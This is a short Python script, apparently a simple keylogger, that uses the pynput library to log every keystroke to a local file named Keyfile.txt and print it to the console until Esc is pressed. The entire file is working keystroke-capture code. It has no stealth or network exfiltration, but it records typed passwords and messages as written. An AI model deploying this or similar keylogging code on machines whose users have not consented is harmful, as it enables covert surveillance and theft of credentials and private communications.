from pynput.keyboard import Key, Listener

def on_press(key):
    print(str(key))
    with open("Keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            logkey.write(f'[{key}]')  # Log non-character keys

def on_release(key):
    if key == Key.esc:  # Corrected the key check
        return False  # Stop listener

if __name__ == "__main__":
    listener = Listener(on_press=on_press, on_release=on_release)  # Corrected listener initialization
    listener.start()  # Start the listener
    listener.join()  # Keep the listener running
